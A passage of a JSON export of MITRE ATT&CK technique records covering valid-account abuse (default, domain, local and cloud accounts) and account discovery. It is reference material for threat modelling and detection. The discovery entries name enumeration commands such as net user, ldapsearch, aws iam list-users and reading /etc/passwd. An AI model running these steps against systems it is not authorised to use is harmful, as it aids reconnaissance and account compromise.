    "technique_description": "<p>Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems or default factory/provider set accounts on other types of systems, software, or devices.(Citation: Microsoft Local Accounts Feb 2019)<!-- raw HTML omitted --><!-- raw HTML omitted -->Default accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen <a href=\"https://attack.mitre.org/techniques/T1552/004\">Private Keys</a> or credential materials to legitimately connect to remote environments via <a href=\"https://attack.mitre.org/techniques/T1021\">Remote Services</a>.(Citation: Metasploit SSH Module)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/70.html",
        "description": "none",
        "external_id": "CAPEC-70"
      },
      {
        "source_name": "Microsoft Local Accounts Feb 2019",
        "url": "https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/local-accounts",
        "description": "Microsoft. (2018, December 9). Local Accounts. Retrieved February 11, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Metasploit SSH Module",
        "url": "https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/linux/ssh",
        "description": "undefined. (n.d.). Retrieved April 12, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--c3d4bdd9-2cfe-4a80-9d0c-07a29ecdce8f",
    "platform": "linux|macos|windows",
    "tid": "T1078.002",
    "technique": "Domain Accounts",
    "tactic": "defense-evasion",
    "datasources": "authentication-logs|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. (Citation: TechNet Credential Theft) Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.(Citation: Microsoft AD Accounts)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may compromise domain accounts, some with a high level of privileges, through various means such as <a href=\"https://attack.mitre.org/techniques/T1003\">OS Credential Dumping</a> or password reuse, allowing access to privileged resources of the domain.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/560.html",
        "description": "none",
        "external_id": "CAPEC-560"
      },
      {
        "source_name": "TechNet Credential Theft",
        "url": "https://technet.microsoft.com/en-us/library/dn535501.aspx",
        "description": "Microsoft. (2016, April 15). Attractive Accounts for Credential Theft. Retrieved June 3, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft AD Accounts",
        "url": "https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-accounts",
        "description": "Microsoft. (2019, August 23). Active Directory Accounts. Retrieved March 13, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Audit Policy",
        "url": "https://technet.microsoft.com/en-us/library/dn487457.aspx",
        "description": "Microsoft. (2016, April 15). Audit Policy Recommendations. Retrieved June 3, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--c3d4bdd9-2cfe-4a80-9d0c-07a29ecdce8f",
    "platform": "linux|macos|windows",
    "tid": "T1078.002",
    "technique": "Domain Accounts",
    "tactic": "persistence",
    "datasources": "authentication-logs|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. (Citation: TechNet Credential Theft) Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.(Citation: Microsoft AD Accounts)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may compromise domain accounts, some with a high level of privileges, through various means such as <a href=\"https://attack.mitre.org/techniques/T1003\">OS Credential Dumping</a> or password reuse, allowing access to privileged resources of the domain.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/560.html",
        "description": "none",
        "external_id": "CAPEC-560"
      },
      {
        "source_name": "TechNet Credential Theft",
        "url": "https://technet.microsoft.com/en-us/library/dn535501.aspx",
        "description": "Microsoft. (2016, April 15). Attractive Accounts for Credential Theft. Retrieved June 3, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft AD Accounts",
        "url": "https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-accounts",
        "description": "Microsoft. (2019, August 23). Active Directory Accounts. Retrieved March 13, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Audit Policy",
        "url": "https://technet.microsoft.com/en-us/library/dn487457.aspx",
        "description": "Microsoft. (2016, April 15). Audit Policy Recommendations. Retrieved June 3, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--c3d4bdd9-2cfe-4a80-9d0c-07a29ecdce8f",
    "platform": "linux|macos|windows",
    "tid": "T1078.002",
    "technique": "Domain Accounts",
    "tactic": "privilege-escalation",
    "datasources": "authentication-logs|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. (Citation: TechNet Credential Theft) Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.(Citation: Microsoft AD Accounts)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may compromise domain accounts, some with a high level of privileges, through various means such as <a href=\"https://attack.mitre.org/techniques/T1003\">OS Credential Dumping</a> or password reuse, allowing access to privileged resources of the domain.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/560.html",
        "description": "none",
        "external_id": "CAPEC-560"
      },
      {
        "source_name": "TechNet Credential Theft",
        "url": "https://technet.microsoft.com/en-us/library/dn535501.aspx",
        "description": "Microsoft. (2016, April 15). Attractive Accounts for Credential Theft. Retrieved June 3, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft AD Accounts",
        "url": "https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-accounts",
        "description": "Microsoft. (2019, August 23). Active Directory Accounts. Retrieved March 13, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Audit Policy",
        "url": "https://technet.microsoft.com/en-us/library/dn487457.aspx",
        "description": "Microsoft. (2016, April 15). Audit Policy Recommendations. Retrieved June 3, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--c3d4bdd9-2cfe-4a80-9d0c-07a29ecdce8f",
    "platform": "linux|macos|windows",
    "tid": "T1078.002",
    "technique": "Domain Accounts",
    "tactic": "initial-access",
    "datasources": "authentication-logs|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. (Citation: TechNet Credential Theft) Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.(Citation: Microsoft AD Accounts)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may compromise domain accounts, some with a high level of privileges, through various means such as <a href=\"https://attack.mitre.org/techniques/T1003\">OS Credential Dumping</a> or password reuse, allowing access to privileged resources of the domain.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/560.html",
        "description": "none",
        "external_id": "CAPEC-560"
      },
      {
        "source_name": "TechNet Credential Theft",
        "url": "https://technet.microsoft.com/en-us/library/dn535501.aspx",
        "description": "Microsoft. (2016, April 15). Attractive Accounts for Credential Theft. Retrieved June 3, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft AD Accounts",
        "url": "https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-accounts",
        "description": "Microsoft. (2019, August 23). Active Directory Accounts. Retrieved March 13, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Audit Policy",
        "url": "https://technet.microsoft.com/en-us/library/dn487457.aspx",
        "description": "Microsoft. (2016, April 15). Audit Policy Recommendations. Retrieved June 3, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--fdc47f44-dd32-4b99-af5f-209f556f63c2",
    "platform": "linux|macos|windows",
    "tid": "T1078.003",
    "technique": "Local Accounts",
    "tactic": "defense-evasion",
    "datasources": "authentication-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.<!-- raw HTML omitted --><!-- raw HTML omitted -->Local Accounts may also be abused to elevate privileges and harvest credentials through <a href=\"https://attack.mitre.org/techniques/T1003\">OS Credential Dumping</a>. Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--fdc47f44-dd32-4b99-af5f-209f556f63c2",
    "platform": "linux|macos|windows",
    "tid": "T1078.003",
    "technique": "Local Accounts",
    "tactic": "persistence",
    "datasources": "authentication-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.<!-- raw HTML omitted --><!-- raw HTML omitted -->Local Accounts may also be abused to elevate privileges and harvest credentials through <a href=\"https://attack.mitre.org/techniques/T1003\">OS Credential Dumping</a>. Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--fdc47f44-dd32-4b99-af5f-209f556f63c2",
    "platform": "linux|macos|windows",
    "tid": "T1078.003",
    "technique": "Local Accounts",
    "tactic": "privilege-escalation",
    "datasources": "authentication-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.<!-- raw HTML omitted --><!-- raw HTML omitted -->Local Accounts may also be abused to elevate privileges and harvest credentials through <a href=\"https://attack.mitre.org/techniques/T1003\">OS Credential Dumping</a>. Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--fdc47f44-dd32-4b99-af5f-209f556f63c2",
    "platform": "linux|macos|windows",
    "tid": "T1078.003",
    "technique": "Local Accounts",
    "tactic": "initial-access",
    "datasources": "authentication-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.<!-- raw HTML omitted --><!-- raw HTML omitted -->Local Accounts may also be abused to elevate privileges and harvest credentials through <a href=\"https://attack.mitre.org/techniques/T1003\">OS Credential Dumping</a>. Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--f232fa7a-025c-4d43-abc7-318e81a73d65",
    "platform": "aws|gcp|azure|saas|azure-ad|office-365",
    "tid": "T1078.004",
    "technique": "Cloud Accounts",
    "tactic": "defense-evasion",
    "datasources": "authentication-logs|aws-cloudtrail-logs|azure-activity-logs|stackdriver-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may obtain and abuse credentials of a cloud account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. In some cases, cloud accounts may be federated with traditional identity management system, such as Window Active Directory. (Citation: AWS Identity Federation)(Citation: Google Federating GC)(Citation: Microsoft Deploying AD Federation)<!-- raw HTML omitted --><!-- raw HTML omitted -->Compromised credentials for cloud accounts can be used to harvest sensitive data from online storage accounts and databases. Access to cloud accounts can also be abused to gain Initial Access to a network by abusing a <a href=\"https://attack.mitre.org/techniques/T1199\">Trusted Relationship</a>. Similar to <a href=\"https://attack.mitre.org/techniques/T1078/002\">Domain Accounts</a>, compromise of federated cloud accounts may allow adversaries to more easily move laterally within an environment.</p>\n",
    "technique_references": [
      {
        "source_name": "AWS Identity Federation",
        "url": "https://aws.amazon.com/identity/federation/",
        "description": "Amazon. (n.d.). Identity Federation in AWS. Retrieved March 13, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Google Federating GC",
        "url": "https://cloud.google.com/solutions/federating-gcp-with-active-directory-introduction",
        "description": "Google. (n.d.). Federating Google Cloud with Active Directory. Retrieved March 13, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Deploying AD Federation",
        "url": "https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/deployment/how-to-connect-fed-azure-adfs",
        "description": "Microsoft. (n.d.). Deploying Active Directory Federation Services in Azure. Retrieved March 13, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--f232fa7a-025c-4d43-abc7-318e81a73d65",
    "platform": "aws|gcp|azure|saas|azure-ad|office-365",
    "tid": "T1078.004",
    "technique": "Cloud Accounts",
    "tactic": "persistence",
    "datasources": "authentication-logs|aws-cloudtrail-logs|azure-activity-logs|stackdriver-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may obtain and abuse credentials of a cloud account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. In some cases, cloud accounts may be federated with traditional identity management system, such as Window Active Directory. (Citation: AWS Identity Federation)(Citation: Google Federating GC)(Citation: Microsoft Deploying AD Federation)<!-- raw HTML omitted --><!-- raw HTML omitted -->Compromised credentials for cloud accounts can be used to harvest sensitive data from online storage accounts and databases. Access to cloud accounts can also be abused to gain Initial Access to a network by abusing a <a href=\"https://attack.mitre.org/techniques/T1199\">Trusted Relationship</a>. Similar to <a href=\"https://attack.mitre.org/techniques/T1078/002\">Domain Accounts</a>, compromise of federated cloud accounts may allow adversaries to more easily move laterally within an environment.</p>\n",
    "technique_references": [
      {
        "source_name": "AWS Identity Federation",
        "url": "https://aws.amazon.com/identity/federation/",
        "description": "Amazon. (n.d.). Identity Federation in AWS. Retrieved March 13, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Google Federating GC",
        "url": "https://cloud.google.com/solutions/federating-gcp-with-active-directory-introduction",
        "description": "Google. (n.d.). Federating Google Cloud with Active Directory. Retrieved March 13, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Deploying AD Federation",
        "url": "https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/deployment/how-to-connect-fed-azure-adfs",
        "description": "Microsoft. (n.d.). Deploying Active Directory Federation Services in Azure. Retrieved March 13, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--f232fa7a-025c-4d43-abc7-318e81a73d65",
    "platform": "aws|gcp|azure|saas|azure-ad|office-365",
    "tid": "T1078.004",
    "technique": "Cloud Accounts",
    "tactic": "privilege-escalation",
    "datasources": "authentication-logs|aws-cloudtrail-logs|azure-activity-logs|stackdriver-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may obtain and abuse credentials of a cloud account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. In some cases, cloud accounts may be federated with traditional identity management system, such as Window Active Directory. (Citation: AWS Identity Federation)(Citation: Google Federating GC)(Citation: Microsoft Deploying AD Federation)<!-- raw HTML omitted --><!-- raw HTML omitted -->Compromised credentials for cloud accounts can be used to harvest sensitive data from online storage accounts and databases. Access to cloud accounts can also be abused to gain Initial Access to a network by abusing a <a href=\"https://attack.mitre.org/techniques/T1199\">Trusted Relationship</a>. Similar to <a href=\"https://attack.mitre.org/techniques/T1078/002\">Domain Accounts</a>, compromise of federated cloud accounts may allow adversaries to more easily move laterally within an environment.</p>\n",
    "technique_references": [
      {
        "source_name": "AWS Identity Federation",
        "url": "https://aws.amazon.com/identity/federation/",
        "description": "Amazon. (n.d.). Identity Federation in AWS. Retrieved March 13, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Google Federating GC",
        "url": "https://cloud.google.com/solutions/federating-gcp-with-active-directory-introduction",
        "description": "Google. (n.d.). Federating Google Cloud with Active Directory. Retrieved March 13, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Deploying AD Federation",
        "url": "https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/deployment/how-to-connect-fed-azure-adfs",
        "description": "Microsoft. (n.d.). Deploying Active Directory Federation Services in Azure. Retrieved March 13, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--f232fa7a-025c-4d43-abc7-318e81a73d65",
    "platform": "aws|gcp|azure|saas|azure-ad|office-365",
    "tid": "T1078.004",
    "technique": "Cloud Accounts",
    "tactic": "initial-access",
    "datasources": "authentication-logs|aws-cloudtrail-logs|azure-activity-logs|stackdriver-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may obtain and abuse credentials of a cloud account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. In some cases, cloud accounts may be federated with traditional identity management system, such as Window Active Directory. (Citation: AWS Identity Federation)(Citation: Google Federating GC)(Citation: Microsoft Deploying AD Federation)<!-- raw HTML omitted --><!-- raw HTML omitted -->Compromised credentials for cloud accounts can be used to harvest sensitive data from online storage accounts and databases. Access to cloud accounts can also be abused to gain Initial Access to a network by abusing a <a href=\"https://attack.mitre.org/techniques/T1199\">Trusted Relationship</a>. Similar to <a href=\"https://attack.mitre.org/techniques/T1078/002\">Domain Accounts</a>, compromise of federated cloud accounts may allow adversaries to more easily move laterally within an environment.</p>\n",
    "technique_references": [
      {
        "source_name": "AWS Identity Federation",
        "url": "https://aws.amazon.com/identity/federation/",
        "description": "Amazon. (n.d.). Identity Federation in AWS. Retrieved March 13, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Google Federating GC",
        "url": "https://cloud.google.com/solutions/federating-gcp-with-active-directory-introduction",
        "description": "Google. (n.d.). Federating Google Cloud with Active Directory. Retrieved March 13, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Deploying AD Federation",
        "url": "https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/deployment/how-to-connect-fed-azure-adfs",
        "description": "Microsoft. (n.d.). Deploying Active Directory Federation Services in Azure. Retrieved March 13, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--25659dd6-ea12-45c4-97e6-381e3e4b593e",
    "platform": "linux|macos|windows",
    "tid": "T1087.001",
    "technique": "Local Account",
    "tactic": "discovery",
    "datasources": "api-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.<!-- raw HTML omitted --><!-- raw HTML omitted -->Commands such as <!-- raw HTML omitted -->net user<!-- raw HTML omitted --> and <!-- raw HTML omitted -->net localgroup<!-- raw HTML omitted --> of the <a href=\"https://attack.mitre.org/software/S0039\">Net</a> utility and <!-- raw HTML omitted -->id<!-- raw HTML omitted --> and <!-- raw HTML omitted -->groups<!-- raw HTML omitted -->on macOS and Linux can list local users and groups. On Linux, local users can also be enumerated through the use of the <!-- raw HTML omitted -->/etc/passwd<!-- raw HTML omitted --> file.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--21875073-b0ee-49e3-9077-1e2a885359af",
    "platform": "linux|macos|windows",
    "tid": "T1087.002",
    "technique": "Domain Account",
    "tactic": "discovery",
    "datasources": "api-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior.<!-- raw HTML omitted --><!-- raw HTML omitted -->Commands such as <!-- raw HTML omitted -->net user /domain<!-- raw HTML omitted --> and <!-- raw HTML omitted -->net group /domain<!-- raw HTML omitted --> of the <a href=\"https://attack.mitre.org/software/S0039\">Net</a> utility, <!-- raw HTML omitted -->dscacheutil -q group<!-- raw HTML omitted -->on macOS, and <!-- raw HTML omitted -->ldapsearch<!-- raw HTML omitted --> on Linux can list domain users and groups.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/575.html",
        "description": "none",
        "external_id": "CAPEC-575"
      }
    ]
  },
  {
    "id": "attack-pattern--4bc31b94-045b-4752-8920-aebaebdb6470",
    "platform": "windows|office-365",
    "tid": "T1087.003",
    "technique": "Email Account",
    "tactic": "discovery",
    "datasources": "office-365-account-logs|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to get a listing of email addresses and accounts. Adversaries may try to dump Exchange address lists such as global address lists (GALs).(Citation: Microsoft Exchange Address Lists)<!-- raw HTML omitted --><!-- raw HTML omitted -->In on-premises Exchange and Exchange Online, the<!-- raw HTML omitted -->Get-GlobalAddressList<!-- raw HTML omitted --> PowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session.(Citation: Microsoft getglobaladdresslist)(Citation: Black Hills Attacking Exchange MailSniper, 2016)</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft Exchange Address Lists",
        "url": "https://docs.microsoft.com/en-us/exchange/email-addresses-and-address-books/address-lists/address-lists?view=exchserver-2019",
        "description": "Microsoft. (2020, February 7). Address lists in Exchange Server. Retrieved March 26, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft getglobaladdresslist",
        "url": "https://docs.microsoft.com/en-us/powershell/module/exchange/email-addresses-and-address-books/get-globaladdresslist",
        "description": "Microsoft. (n.d.). Get-GlobalAddressList. Retrieved October 6, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Black Hills Attacking Exchange MailSniper, 2016",
        "url": "https://www.blackhillsinfosec.com/attacking-exchange-with-mailsniper/",
        "description": "Bullock, B.. (2016, October 3). Attacking Exchange with MailSniper. Retrieved October 6, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--8f104855-e5b7-4077-b1f5-bc3103b41abe",
    "platform": "aws|gcp|azure|office-365|azure-ad|saas",
    "tid": "T1087.004",
    "technique": "Cloud Account",
    "tactic": "discovery",
    "datasources": "aws-cloudtrail-logs|azure-activity-logs|office-365-account-logs|process-command-line-parameters|process-monitoring|stackdriver-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to get a listing of cloud accounts. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application.<!-- raw HTML omitted --><!-- raw HTML omitted -->With authenticated access there are several tools that can be used to find accounts. The <!-- raw HTML omitted -->Get-MsolRoleMember<!-- raw HTML omitted --> PowerShell cmdlet can be used to obtain account names given a role or permissions group in Office 365.(Citation: Microsoft msolrolemember)(Citation: GitHub Raindance) The Azure CLI (AZ CLI) also provides an interface to obtain user accounts with authenticated access to a domain. The command <!-- raw HTML omitted -->az ad user list<!-- raw HTML omitted --> will list all users within a domain.(Citation: Microsoft AZ CLI)(Citation: Black Hills Red Teaming MS AD Azure, 2018) <!-- raw HTML omitted --><!-- raw HTML omitted -->The AWS command <!-- raw HTML omitted -->aws iam list-users<!-- raw HTML omitted --> may be used to obtain a list of users in the current account while <!-- raw HTML omitted -->aws iam list-roles<!-- raw HTML omitted --> can obtain IAM roles that have a specified path prefix.(Citation: AWS List Roles)(Citation: AWS List Users) In GCP, <!-- raw HTML omitted -->gcloud iam service-accounts list<!-- raw HTML omitted --> and <!-- raw HTML omitted -->gcloud projects get-iam-policy<!-- raw HTML omitted --> may be used to obtain a listing of service accounts and users in a project.(Citation: Google Cloud - IAM Servie Accounts List API)</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft msolrolemember",
        "url": "https://docs.microsoft.com/en-us/powershell/module/msonline/get-msolrolemember?view=azureadps-1.0",
        "description": "Microsoft. (n.d.). Get-MsolRoleMember. Retrieved October 6, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub Raindance",
        "url": "https://github.com/True-Demon/raindance",
        "description": "Stringer, M.. (2018, November 21). RainDance. Retrieved October 6, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft AZ CLI",
        "url": "https://docs.microsoft.com/en-us/cli/azure/ad/user?view=azure-cli-latest",
        "description": "Microsoft. (n.d.). az ad user. Retrieved October 6, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Black Hills Red Teaming MS AD Azure, 2018",
        "url": "https://www.blackhillsinfosec.com/red-teaming-microsoft-part-1-active-directory-leaks-via-azure/",
        "description": "Felch, M.. (2018, August 31). Red Teaming Microsoft Part 1 Active Directory Leaks via Azure. Retrieved October 6, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "AWS List Roles",
        "url": "https://docs.aws.amazon.com/cli/latest/reference/iam/list-roles.html",
        "description": "Amazon. (n.d.). List Roles. Retrieved August 11, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "AWS List Users",
        "url": "https://docs.aws.amazon.com/cli/latest/reference/iam/list-users.html",
        "description": "Amazon. (n.d.). List Users. Retrieved August 11, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Google Cloud - IAM Servie Accounts List API",
        "url": "https://cloud.google.com/sdk/gcloud/reference/iam/service-accounts/list",
        "description": "Google. (2020, June 23). gcloud iam service-accounts list. Retrieved August 4, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--f6dacc85-b37d-458e-b58d-74fc4bbf5755",
    "platform": "linux|macos|windows",
    "tid": "T1090.001",
    "technique": "Internal Proxy",
    "tactic": "command-and-control",
    "datasources": "netflow-enclave-netflow|network-protocol-analysis|packet-capture|process-monitoring|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
